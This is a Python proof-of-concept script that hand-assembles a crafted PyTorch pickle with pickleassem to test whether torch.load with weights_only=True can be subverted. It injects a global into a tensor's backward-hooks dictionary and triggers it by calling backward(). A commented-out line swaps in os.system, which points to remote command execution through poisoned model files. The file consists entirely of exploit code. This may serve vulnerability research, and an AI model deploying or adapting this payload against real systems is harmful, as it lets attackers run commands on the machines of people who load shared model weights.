import io
import os
import pickletools

import torch
from pickleassem import PickleAssembler
from torch.serialization import _open_zipfile_writer


def create_auto():
    t = torch.tensor([1.0], dtype=torch.float64, requires_grad=True)
    t.register_hook(lambda x: x * 2)
    print(t)
    torch.save(t, "tensor.pkl")


def create_manual():
    pa = PickleAssembler(proto=2)
    pa.push_global("torch", "_utils._rebuild_tensor_v2")
    pa.push_mark()
    pa.push_mark()
    pa.push_binunicode("storage")
    pa.push_global("torch", "DoubleStorage")
    pa.push_binunicode("0")
    pa.push_binunicode("cpu")
    pa.push_binint1(1)
    pa.build_tuple()
    pa.push_binpersid()
    pa.push_binint1(0)
    pa.push_binint1(1)
    pa.build_tuple1()
    pa.push_binint1(1)
    pa.build_tuple1()
    pa.push_true()
    pa.push_global("collections", "OrderedDict")
    pa.push_empty_tuple()
    pa.build_reduce()
    ####
    pa.push_binint1(0)
    # pa.push_global("os", "system")
    pa.push_global("torch", "_utils._rebuild_tensor")
    pa.build_setitem()
    ####
    pa.build_tuple()
    pa.build_reduce()
    payload = pa.assemble()

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("tensor.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))
        with open("data_0", "rb") as f:
            tdata = f.read()
            zip_file.write_record("data/0", tdata, len(tdata))


if __name__ == "__main__":

    # create_auto()

    create_manual()

    with open("tensor.pkl", "rb") as f:
        x = torch.load(f, weights_only=True)
        print(x)
        x.backward()

    # with open("tensor.pkl", "rb") as f:
    #     p = f.read()
    #     pickletools.dis(p)
